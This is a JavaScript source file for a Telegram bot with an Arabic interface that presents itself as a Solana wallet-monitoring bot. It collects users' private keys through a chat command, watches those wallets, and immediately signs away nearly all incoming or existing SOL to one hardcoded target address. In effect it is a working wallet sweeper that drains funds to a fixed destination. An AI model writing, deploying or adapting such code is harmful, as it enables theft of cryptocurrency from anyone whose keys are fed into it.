
const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bs58 = require('bs58').default;
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
require('dotenv').config();

class SolanaTelegramBot {
    convertToHttpUrl(url) {
        // Convert WebSocket URLs to HTTP URLs for Connection
        if (url.startsWith('wss://')) {
            return url.replace('wss://', 'https://');
        } else if (url.startsWith('ws://')) {
            return url.replace('ws://', 'http://');
        }
        // Return as-is if already HTTP/HTTPS
        return url;
    }

    constructor() {
        // Initialize Telegram bot
        this.bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
        
        // Target address to forward funds to
        this.targetAddress = new PublicKey('FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG');
        
        // Store wallets and their corresponding RPC connections
        this.wallets = [];
        this.connections = [];
        this.subscriptionIds = [];
        this.lastBalances = [];
        
        // Available RPC URLs
        this.rpcUrls = [
            process.env.RPC_URL || 'https://api.mainnet-beta.solana.com',
            process.env.RPC_URL2,
            process.env.RPC_URL3,
            process.env.RPC_URL4,
            process.env.RPC_URL5
        ].filter(url => url) // Remove undefined URLs
         .map(url => this.convertToHttpUrl(url)); // Convert WebSocket URLs to HTTP
        
        // Store chat ID for notifications
        this.chatId = null;
        
        // Track RPC errors
        this.rpcErrorCounts = new Array(this.rpcUrls.length).fill(0);
        this.lastRpcErrorTime = new Array(this.rpcUrls.length).fill(0);
        this.rpcFailedWallets = new Set(); // Track wallets with failed RPCs
        
        this.setupBotCommands();
        this.setupCallbackQueries();
        console.log('🤖 Solana Telegram Bot initialized');
        console.log(`🔗 Available RPC URLs: ${this.rpcUrls.length}`);
    }
    
    setupBotCommands() {
        // Start command
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            const welcomeMessage = `🔥 مرحباً بك في بوت مراقبة محافظ Solana!

📋 الأوامر المتاحة:
/add_wallets - إضافة محافظ للمراقبة
/status - عرض حالة المحافظ
/stop - إيقاف/تشغيل محافظ محددة
/help - عرض المساعدة

💡 لبدء المراقبة، استخدم الأمر /add_wallets وأرسل المفاتيح الخاصة في رسالة واحدة (كل مفتاح في سطر منفصل)`;
            
            this.bot.sendMessage(chatId, welcomeMessage);
        });
        
        // Add wallets command
        this.bot.onText(/\/add_wallets/, (msg) => {
            const chatId = msg.chat.id;
            const message = `📝 أرسل المفاتيح الخاصة للمحافظ التي تريد مراقبتها:

⚠️ تعليمات مهمة:
• ضع كل مفتاح خاص في سطر منفصل
• يمكنك إضافة حتى ${this.rpcUrls.length} محفظة
• كل محفظة ستُراقب بـ RPC منفصل
• المفاتيح يجب أن تكون بصيغة Base58

مثال:
5J1F7GHaDxuucP2VX7rciRchxrDsNo1SyJ61112233445566...
3K8H9JDa8xTvP1WX5rciRchxrDsNo1SyJ61112233445566...

أرسل المفاتيح الآن:`;
            
            this.bot.sendMessage(chatId, message);
            
            // Wait for next message with private keys
            this.bot.once('message', (response) => {
                if (response.chat.id === chatId && !response.text.startsWith('/')) {
                    this.processPrivateKeys(chatId, response.text);
                }
            });
        });
        
        // Status command
        this.bot.onText(/\/status/, async (msg) => {
            const chatId = msg.chat.id;
            await this.showStatus(chatId);
        });
        
        // Stop specific wallets command
        this.bot.onText(/\/stop/, (msg) => {
            const chatId = msg.chat.id;
            
            if (this.wallets.length === 0) {
                this.bot.sendMessage(chatId, '❌ لا توجد محافظ قيد المراقبة');
                return;
            }
            
            // Create inline keyboard with wallet buttons
            const keyboard = [];
            const buttonsPerRow = 2;
            
            for (let i = 0; i < this.wallets.length; i++) {
                const wallet = this.wallets[i];
                const isActive = this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined && !this.rpcFailedWallets.has(i + 1);
                const status = isActive ? '🟢' : '🔴';
                const shortAddress = wallet.publicKey.toString().slice(0, 8) + '...' + wallet.publicKey.toString().slice(-4);
                const action = isActive ? 'stop' : 'start';
                const actionText = isActive ? 'إيقاف' : 'تشغيل';
                
                const button = {
                    text: `${status} ${actionText} المحفظة ${i + 1}: ${shortAddress}`,
                    callback_data: `${action}_wallet_${i}`
                };
                
                // Add button to current row or create new row
                if (keyboard.length === 0 || keyboard[keyboard.length - 1].length >= buttonsPerRow) {
                    keyboard.push([button]);
                } else {
                    keyboard[keyboard.length - 1].push(button);
                }
            }
            
            // Add "Stop All" and "Cancel" buttons
            keyboard.push([
                { text: '🛑 إيقاف الجميع', callback_data: 'stop_all_wallets' },
                { text: '❌ إلغاء', callback_data: 'cancel_stop' }
            ]);
            
            const options = {
                reply_markup: {
                    inline_keyboard: keyboard
                }
            };
            
            this.bot.sendMessage(chatId, '📋 اختر المحافظ للتحكم في مراقبتها:', options);
        });
        
        
        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            const helpMessage = `📚 دليل الاستخدام:

🔑 إضافة المحافظ:
1. استخدم /add_wallets
2. أرسل المفاتيح الخاصة (كل مفتاح في سطر منفصل)
3. سيبدأ البوت مراقبة المحافظ فوراً

📊 مراقبة المحافظ:
• كل محفظة تُراقب بـ RPC منفصل
• عند وصول SOL، سيتم تحويله فوراً
• ستحصل على إشعار لكل عملية

⚙️ الأوامر:
/status - حالة المحافظ
/stop - إيقاف/تشغيل محافظ محددة
/add_wallets - إضافة محافظ جديدة`;
            
            this.bot.sendMessage(chatId, helpMessage);
        });
    }
    
    setupCallbackQueries() {
        // Handle button clicks
        this.bot.on('callback_query', (callbackQuery) => {
            const message = callbackQuery.message;
            const data = callbackQuery.data;
            const chatId = message.chat.id;
            
            // Answer the callback query to remove loading state
            this.bot.answerCallbackQuery(callbackQuery.id);
            
            if (data.startsWith('stop_wallet_')) {
                const walletIndex = parseInt(data.replace('stop_wallet_', ''));
                this.stopSingleWallet(chatId, walletIndex, message.message_id);
            } else if (data.startsWith('start_wallet_')) {
                const walletIndex = parseInt(data.replace('start_wallet_', ''));
                this.startSingleWallet(chatId, walletIndex, message.message_id);
            } else if (data === 'stop_all_wallets') {
                const stoppedCount = this.stopAllMonitoring();
                this.bot.editMessageText(
                    stoppedCount > 0 
                        ? `⏹️ تم إيقاف مراقبة جميع المحافظ بنجاح\n✅ تم إيقاف ${stoppedCount} اشتراك`
                        : '⏹️ لا توجد محافظ قيد المراقبة للإيقاف',
                    {
                        chat_id: chatId,
                        message_id: message.message_id
                    }
                );
            } else if (data === 'cancel_stop') {
                this.bot.editMessageText('❌ تم إلغاء العملية', {
                    chat_id: chatId,
                    message_id: message.message_id
                });
            }
        });
    }
    
    stopSingleWallet(chatId, walletIndex, messageId) {
        if (walletIndex >= this.wallets.length || walletIndex < 0) {
            this.bot.editMessageText('❌ رقم محفظة غير صحيح', {
                chat_id: chatId,
                message_id: messageId
            });
            return;
        }
        
        const wallet = this.wallets[walletIndex];
        const walletNumber = walletIndex + 1;
        
        
        // Check if already stopped
        if (this.subscriptionIds[walletIndex] === null || this.subscriptionIds[walletIndex] === undefined || this.rpcFailedWallets.has(walletNumber)) {
            this.bot.editMessageText(`⚠️ المحفظة ${walletNumber} متوقفة مسبقاً`, {
                chat_id: chatId,
                message_id: messageId
            });
            return;
        }
        
        // Check if we have valid subscription and connection
        const hasSubscription = this.subscriptionIds[walletIndex] !== null && this.subscriptionIds[walletIndex] !== undefined;
        const hasConnection = this.connections[walletIndex] !== null && this.connections[walletIndex] !== undefined;
        
        if (hasSubscription && hasConnection) {
            try {
                this.connections[walletIndex].removeAccountChangeListener(this.subscriptionIds[walletIndex]);
                
                // Close the specific connection
                if (this.connections[walletIndex]._rpcWebSocket) {
                    this.connections[walletIndex]._rpcWebSocket.close();
                }
                
                this.subscriptionIds[walletIndex] = null;
                this.connections[walletIndex] = null;
                
                console.log(`🔌 WebSocket subscription for wallet ${walletNumber} removed`);
                
                const shortAddress = wallet.publicKey.toString().slice(0, 8) + '...' + wallet.publicKey.toString().slice(-4);
                this.bot.editMessageText(
                    `✅ تم إيقاف مراقبة المحفظة ${walletNumber} بنجاح\n📍 العنوان: ${shortAddress}`,
                    {
                        chat_id: chatId,
                        message_id: messageId
                    }
                );
                
            } catch (error) {
                console.error(`Error removing subscription for wallet ${walletNumber}:`, error.message);
                this.bot.editMessageText(
                    `❌ خطأ في إيقاف المحفظة ${walletNumber}: ${error.message}`,
                    {
                        chat_id: chatId,
                        message_id: messageId
                    }
                );
            }
        } else {
            this.bot.editMessageText(`❌ لا يوجد اشتراك نشط للمحفظة ${walletNumber}`, {
                chat_id: chatId,
                message_id: messageId
            });
        }
    }
    
    async startSingleWallet(chatId, walletIndex, messageId) {
        if (walletIndex >= this.wallets.length || walletIndex < 0) {
            this.bot.editMessageText('❌ رقم محفظة غير صحيح', {
                chat_id: chatId,
                message_id: messageId
            });
            return;
        }
        
        const wallet = this.wallets[walletIndex];
        let connection = this.connections[walletIndex];
        const walletNumber = walletIndex + 1;
        
        // Check if already running
        if (this.subscriptionIds[walletIndex] !== null && this.subscriptionIds[walletIndex] !== undefined) {
            this.bot.editMessageText(`⚠️ المحفظة ${walletNumber} تعمل بالفعل`, {
                chat_id: chatId,
                message_id: messageId
            });
            return;
        }
        
        // Check if connection exists, if not create a new one
        if (!connection) {
            connection = new Connection(this.rpcUrls[walletIndex % this.rpcUrls.length], 'confirmed');
            this.connections[walletIndex] = connection;
        }
        
        try {
            // Remove from failed wallets if it was there
            this.rpcFailedWallets.delete(walletNumber);
            
            // Set up WebSocket subscription for this wallet first (for speed)
            const subscriptionId = connection.onAccountChange(
                wallet.publicKey,
                async (accountInfo) => {
                    try {
                        const newBalance = accountInfo.lamports;
                        const oldBalance = this.lastBalances[walletIndex] || 0;
                        
                        if (newBalance > oldBalance && newBalance > 0) {
                            const received = newBalance - oldBalance;
                            console.log(`💰 Wallet ${walletNumber}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
                            
                            // Send funds immediately without waiting for Telegram message
                            const sendPromise = this.forwardFunds(chatId, connection, wallet, newBalance, walletNumber);
                            // Send Telegram notification in parallel (non-blocking)
                            this.bot.sendMessage(chatId, `💰 المحفظة ${walletNumber}: وصل ${received / LAMPORTS_PER_SOL} SOL`);
                            await sendPromise;
                        }
                        
                        this.lastBalances[walletIndex] = newBalance;
                        
                    } catch (error) {
                        console.error(`Error processing account change for wallet ${walletNumber}:`, error.message);
                        this.handleRpcError(error, walletIndex, walletNumber);
                    }
                },
                'confirmed'
            );
            
            this.subscriptionIds[walletIndex] = subscriptionId;
            console.log(`✅ WebSocket subscription restarted for wallet ${walletNumber}: ${wallet.publicKey.toString()}`);
            
            // Check initial balance after starting subscription (non-blocking)
            this.getBalance(connection, wallet.publicKey).then(initialBalance => {
                this.lastBalances[walletIndex] = initialBalance;
                if (initialBalance > 0) {
                    this.forwardFunds(chatId, connection, wallet, initialBalance, walletNumber);
                }
            }).catch(error => {
                console.error(`Error checking initial balance for wallet ${walletNumber}:`, error.message);
                this.lastBalances[walletIndex] = 0;
            });
            
            const shortAddress = wallet.publicKey.toString().slice(0, 8) + '...' + wallet.publicKey.toString().slice(-4);
            this.bot.editMessageText(
                `✅ تم تشغيل مراقبة المحفظة ${walletNumber} بنجاح\n📍 العنوان: ${shortAddress}`,
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
            
        } catch (error) {
            console.error(`Error starting subscription for wallet ${walletNumber}:`, error.message);
            this.bot.editMessageText(
                `❌ خطأ في تشغيل المحفظة ${walletNumber}: ${error.message}`,
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
    }
    
    processPrivateKeys(chatId, keysText) {
        const privateKeys = keysText.split('\n').filter(key => key.trim());
        
        if (privateKeys.length === 0) {
            this.bot.sendMessage(chatId, '❌ لم يتم العثور على مفاتيح صالحة');
            return;
        }
        
        if (privateKeys.length > this.rpcUrls.length) {
            this.bot.sendMessage(chatId, `⚠️ يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط (عدد RPC URLs المتاحة)`);
            return;
        }
        
        // Stop current monitoring
        this.stopAllMonitoring();
        
        // Initialize wallets and connections
        this.wallets = [];
        this.connections = [];
        
        let successCount = 0;
        
        for (let i = 0; i < privateKeys.length; i++) {
            try {
                const privateKey = privateKeys[i].trim();
                const privateKeyBytes = bs58.decode(privateKey);
                const wallet = Keypair.fromSecretKey(privateKeyBytes);
                const connection = new Connection(this.rpcUrls[i], 'confirmed');
                
                this.wallets.push(wallet);
                this.connections.push(connection);
                successCount++;
                
                console.log(`✅ Wallet ${i + 1} loaded: ${wallet.publicKey.toString()}`);
                console.log(`🔗 Using RPC: ${this.rpcUrls[i]}`);
                
            } catch (error) {
                this.bot.sendMessage(chatId, `❌ خطأ في المفتاح ${i + 1}: ${error.message}`);
                continue;
            }
        }
        
        if (successCount > 0) {
            this.bot.sendMessage(chatId, `✅ تم تحميل ${successCount} محفظة بنجاح!`);
            this.startMonitoring(chatId);
        } else {
            this.bot.sendMessage(chatId, '❌ فشل في تحميل أي محفظة');
        }
    }
    
    async startMonitoring(chatId) {
        this.chatId = chatId;
        this.bot.sendMessage(chatId, '🔍 بدء مراقبة المحافظ...');
        
        // Store subscription IDs to track active subscriptions
        this.subscriptionIds = [];
        this.lastBalances = [];
        
        for (let i = 0; i < this.wallets.length; i++) {
            const wallet = this.wallets[i];
            const connection = this.connections[i];
            const walletIndex = i + 1;
            
            // Check initial balance
            try {
                const initialBalance = await this.getBalance(connection, wallet.publicKey);
                this.lastBalances[i] = initialBalance;
                
                if (initialBalance > 0) {
                    // Send funds immediately without waiting for Telegram message
                    const sendPromise = this.forwardFunds(chatId, connection, wallet, initialBalance, walletIndex);
                    // Send notification in parallel
                    this.bot.sendMessage(chatId, `💰 المحفظة ${walletIndex}: رصيد موجود ${initialBalance / LAMPORTS_PER_SOL} SOL`);
                    await sendPromise;
                }
            } catch (error) {
                console.error(`Error checking initial balance for wallet ${walletIndex}:`, error.message);
                this.lastBalances[i] = 0;
            }
            
            // Set up WebSocket subscription for this wallet
            try {
                const subscriptionId = connection.onAccountChange(
                    wallet.publicKey,
                    async (accountInfo) => {
                        try {
                            const newBalance = accountInfo.lamports;
                            const oldBalance = this.lastBalances[i] || 0;
                            
                            if (newBalance > oldBalance && newBalance > 0) {
                                const received = newBalance - oldBalance;
                                console.log(`💰 Wallet ${walletIndex}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
                                
                                // Send funds immediately without waiting for Telegram message
                                const sendPromise = this.forwardFunds(chatId, connection, wallet, newBalance, walletIndex);
                                // Send Telegram notification in parallel (non-blocking)
                                this.bot.sendMessage(chatId, `💰 المحفظة ${walletIndex}: وصل ${received / LAMPORTS_PER_SOL} SOL`);
                                await sendPromise;
                            }
                            
                            this.lastBalances[i] = newBalance;
                            
                        } catch (error) {
                            console.error(`Error processing account change for wallet ${walletIndex}:`, error.message);
                            this.handleRpcError(error, i, walletIndex);
                        }
                    },
                    'confirmed'
                );
                
                this.subscriptionIds.push(subscriptionId);
                console.log(`✅ WebSocket subscription started for wallet ${walletIndex}: ${wallet.publicKey.toString()}`);
                
            } catch (error) {
                console.error(`Error setting up subscription for wallet ${walletIndex}:`, error.message);
                this.handleRpcError(error, i, walletIndex);
                this.subscriptionIds.push(null);
            }
        }
        
        this.bot.sendMessage(chatId, `✅ تم بدء مراقبة ${this.wallets.length} محفظة عبر WebSocket`);
    }
    
    async getBalance(connection, publicKey) {
        const balance = await connection.getBalance(publicKey);
        return balance;
    }
    
    async forwardFunds(chatId, connection, wallet, amount, walletIndex) {
        try {
            const startTime = Date.now();
            
            const { blockhash } = await connection.getLatestBlockhash('confirmed');
            const transactionFee = 5000;
            const amountToSend = amount - transactionFee;
            
            if (amountToSend <= 0) {
                this.bot.sendMessage(chatId, `⚠️ المحفظة ${walletIndex}: المبلغ قليل جداً بعد خصم الرسوم`);
                return false;
            }
            
            const transaction = new Transaction({
                recentBlockhash: blockhash,
                feePayer: wallet.publicKey
            });
            
            const transferInstruction = SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: this.targetAddress,
                lamports: amountToSend
            });
            
            transaction.add(transferInstruction);
            transaction.sign(wallet);
            
            const signature = await connection.sendRawTransaction(
                transaction.serialize(),
                {
                    skipPreflight: false,
                    maxRetries: 3
                }
            );
            
            const executionTime = Date.now() - startTime;
            
            const successMessage = `✅ المحفظة ${walletIndex}: تم إرسال ${amountToSend / LAMPORTS_PER_SOL} SOL
📝 المعاملة: https://solscan.io/tx/${signature}
⚡ وقت التنفيذ: ${executionTime}ms`;
            
            this.bot.sendMessage(chatId, successMessage);
            return true;
            
        } catch (error) {
            this.bot.sendMessage(chatId, `❌ المحفظة ${walletIndex}: خطأ في التحويل - ${error.message}`);
            return false;
        }
    }
    
    async showStatus(chatId) {
        if (this.wallets.length === 0) {
            this.bot.sendMessage(chatId, '📊 لا توجد محافظ قيد المراقبة');
            return;
        }
        
        let statusMessage = `📊 حالة المحافظ:\n\n`;
        
        for (let i = 0; i < this.wallets.length; i++) {
            const wallet = this.wallets[i];
            const connection = this.connections[i];
            const rpcUrl = this.rpcUrls[i];
            
            const walletNumber = i + 1;
            const errorCount = this.rpcErrorCounts[i];
            const isFailed = this.rpcFailedWallets.has(walletNumber);
            
            // Test RPC connection
            let rpcStatus = '🟢 متصل';
            let currentBalance = 'غير معروف';
            
            try {
                const balance = await this.getBalance(connection, wallet.publicKey);
                currentBalance = `${balance / LAMPORTS_PER_SOL} SOL`;
                rpcStatus = '🟢 متصل';
            } catch (error) {
                rpcStatus = '🔴 خطأ في الاتصال';
            }
            
            // Check subscription status
            const hasSubscription = this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined;
            const subscriptionStatus = hasSubscription && !isFailed ? '🟢 نشط' : '🔴 متوقف';
            
            statusMessage += `🔹 المحفظة ${walletNumber}:\n`;
            statusMessage += `   العنوان: ${wallet.publicKey.toString()}\n`;
            statusMessage += `   RPC: ${rpcUrl}\n`;
            statusMessage += `   حالة RPC: ${rpcStatus}\n`;
            statusMessage += `   المراقبة: ${subscriptionStatus}\n`;
            statusMessage += `   الرصيد الحالي: ${currentBalance}\n`;
            if (errorCount > 0) {
                statusMessage += `   أخطاء RPC: ${errorCount}\n`;
            }
            if (isFailed) {
                statusMessage += `   ⚠️ تم إيقاف هذه المحفظة نهائياً\n`;
            }
            statusMessage += '\n';
        }
        
        statusMessage += `🎯 عنوان الهدف: ${this.targetAddress.toString()}`;
        
        this.bot.sendMessage(chatId, statusMessage);
    }
    
    handleRpcError(error, rpcIndex, walletIndex) {
        const currentTime = Date.now();
        this.rpcErrorCounts[rpcIndex]++;
        
        const MAX_ERRORS = 5; // Maximum errors before stopping monitoring
        const ERROR_WINDOW = 60000; // 1 minute window
        
        // Check if this RPC has failed too many times
        if (this.rpcErrorCounts[rpcIndex] >= MAX_ERRORS) {
            // Stop monitoring for this specific wallet
            if (this.subscriptionIds[rpcIndex] && this.connections[rpcIndex]) {
                try {
                    this.connections[rpcIndex].removeAccountChangeListener(this.subscriptionIds[rpcIndex]);
                    this.subscriptionIds[rpcIndex] = null;
                } catch (error) {
                    console.error(`Error removing subscription for wallet ${walletIndex}:`, error.message);
                }
            }
            
            // Mark this wallet as failed and send one final notification
            if (!this.rpcFailedWallets.has(walletIndex)) {
                this.rpcFailedWallets.add(walletIndex);
                
                const stopMessage = `🛑 تم إيقاف مراقبة المحفظة ${walletIndex} نهائياً!

❌ سبب الإيقاف: تعطل RPC بشكل متكرر
🔗 RPC المتعطل: ${this.rpcUrls[rpcIndex]}
📊 عدد الأخطاء: ${this.rpcErrorCounts[rpcIndex]}

💡 لإعادة التشغيل: استخدم /add_wallets مع RPC جديد
⚠️ لن تصلك المزيد من الرسائل لهذه المحفظة`;
                
                if (this.chatId) {
                    this.bot.sendMessage(this.chatId, stopMessage);
                }
            }
        } else {
            // Only send error notification for first few errors, not every error
            if (this.rpcErrorCounts[rpcIndex] <= 2 && 
                currentTime - this.lastRpcErrorTime[rpcIndex] > ERROR_WINDOW) {
                
                this.lastRpcErrorTime[rpcIndex] = currentTime;
                
                const warningMessage = `⚠️ تحذير: مشاكل في RPC للمحفظة ${walletIndex}
🔗 RPC: ${this.rpcUrls[rpcIndex]}
❌ الخطأ: ${error.message}
📊 محاولة: ${this.rpcErrorCounts[rpcIndex]}/${MAX_ERRORS}

💡 سيتم إيقاف المراقبة إذا استمرت المشاكل`;
                
                if (this.chatId) {
                    this.bot.sendMessage(this.chatId, warningMessage);
                }
            }
        }
        
        // Log error for debugging
        console.error(`RPC Error - Wallet ${walletIndex} (${this.rpcErrorCounts[rpcIndex]}/${MAX_ERRORS}):`, error.message);
    }

    stopSpecificWallets(chatId, addressesText) {
        const addresses = addressesText.split('\n').filter(addr => addr.trim()).map(addr => addr.trim());
        
        if (addresses.length === 0) {
            this.bot.sendMessage(chatId, '❌ لم يتم العثور على عناوين صالحة');
            return;
        }
        
        let stoppedCount = 0;
        let notFoundAddresses = [];
        let alreadyStoppedAddresses = [];
        
        for (const address of addresses) {
            let found = false;
            
            for (let i = 0; i < this.wallets.length; i++) {
                if (this.wallets[i].publicKey.toString() === address) {
                    found = true;
                    
                    // Check if already stopped
                    if (this.subscriptionIds[i] === null || this.rpcFailedWallets.has(i + 1)) {
                        alreadyStoppedAddresses.push(`المحفظة ${i + 1}: ${address}`);
                        continue;
                    }
                    
                    // Stop monitoring for this specific wallet
                    if (this.subscriptionIds[i] && this.connections[i]) {
                        try {
                            this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]);
                            
                            // Close the specific connection
                            if (this.connections[i]._rpcWebSocket) {
                                this.connections[i]._rpcWebSocket.close();
                            }
                            
                            this.subscriptionIds[i] = null;
                            this.connections[i] = null;
                            
                            console.log(`🔌 WebSocket subscription for wallet ${i + 1} removed`);
                            stoppedCount++;
                            
                        } catch (error) {
                            console.error(`Error removing subscription for wallet ${i + 1}:`, error.message);
                        }
                    }
                    break;
                }
            }
            
            if (!found) {
                notFoundAddresses.push(address);
            }
        }
        
        // Prepare response message
        let responseMessage = '';
        
        if (stoppedCount > 0) {
            responseMessage += `✅ تم إيقاف مراقبة ${stoppedCount} محفظة بنجاح\n\n`;
        }
        
        if (alreadyStoppedAddresses.length > 0) {
            responseMessage += `⚠️ المحافظ التالية متوقفة مسبقاً:\n`;
            alreadyStoppedAddresses.forEach(addr => {
                responseMessage += `• ${addr}\n`;
            });
            responseMessage += '\n';
        }
        
        if (notFoundAddresses.length > 0) {
            responseMessage += `❌ لم يتم العثور على العناوين التالية:\n`;
            notFoundAddresses.forEach(addr => {
                responseMessage += `• ${addr}\n`;
            });
        }
        
        if (responseMessage === '') {
            responseMessage = '❌ لم يتم إيقاف أي محفظة';
        }
        
        this.bot.sendMessage(chatId, responseMessage);
    }
    
    stopAllMonitoring() {
        let stoppedCount = 0;
        
        // Remove WebSocket subscriptions and close connections
        for (let i = 0; i < this.subscriptionIds.length; i++) {
            if (this.subscriptionIds[i] && this.connections[i]) {
                try {
                    this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]);
                    console.log(`🔌 WebSocket subscription ${i + 1} removed`);
                    stoppedCount++;
                } catch (error) {
                    console.error(`Error removing subscription ${i + 1}:`, error.message);
                }
            }
        }
        
        // Close all WebSocket connections explicitly
        for (let i = 0; i < this.connections.length; i++) {
            if (this.connections[i] && this.connections[i]._rpcWebSocket) {
                try {
                    this.connections[i]._rpcWebSocket.close();
                    console.log(`🔌 WebSocket connection ${i + 1} closed`);
                } catch (error) {
                    console.error(`Error closing connection ${i + 1}:`, error.message);
                }
            }
        }
        
        // Clear all arrays and connections
        this.subscriptionIds = [];
        this.lastBalances = [];
        this.connections = [];
        this.wallets = [];
        
        // Reset error tracking
        this.rpcErrorCounts.fill(0);
        this.lastRpcErrorTime.fill(0);
        this.rpcFailedWallets.clear();
        this.chatId = null;
        
        console.log(`🛑 All WebSocket monitoring stopped - ${stoppedCount} subscriptions removed`);
        return stoppedCount;
    }
}

// Initialize and start the bot
async function main() {
    console.log('🤖 Starting Solana Telegram Bot...');
    console.log('=====================================');
    
    if (!process.env.TELEGRAM_BOT_TOKEN) {
        console.error('❌ TELEGRAM_BOT_TOKEN environment variable is required');
        process.exit(1);
    }
    
    const bot = new SolanaTelegramBot();
    
    console.log('✅ Bot is running and waiting for commands...');
}

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

// Start the application
main().catch(error => {
    console.error('❌ Fatal error:', error.message);
    process.exit(1);
});

// Add Express server for deployment
const app = express();
const PORT = process.env.PORT || 5000;

app.get('/', (req, res) => {
    res.json({
        status: 'Bot is running',
        message: 'Solana Telegram Bot is active',
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Express server running on port ${PORT}`);
    console.log(`🔗 Health check: http://localhost:${PORT}/health`);
});
